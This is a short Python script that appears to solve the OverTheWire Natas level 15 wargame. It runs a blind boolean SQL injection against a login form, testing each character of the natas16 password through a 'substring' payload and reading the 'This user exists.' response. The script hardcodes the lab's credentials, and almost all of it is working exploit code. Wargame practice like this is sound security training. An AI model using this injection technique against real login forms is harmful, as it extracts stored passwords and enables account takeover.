import requests


url = "http://natas15.natas.labs.overthewire.org"

#authentication for natas16
authentication = ("natas15", "GB6USCJYJjwLyYhZUNkE1NwDueiTow6g")

#create a charset that include all the possible password of natas16 
charset = "AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789"

password_natas16 = ""


for i in range(1, 33):
    for char in charset:

        payload = {'username': f'natas16" AND BINARY substring(password, {i}, 1)="{char}'}


        #use  post function to send request to natas16 server and resonse in response.text
        response = requests.post(url, auth = authentication, data = payload )
        #resonse.text

        if "This user exists." in response.text:
            password_natas16 += char
            break


print(password_natas16)

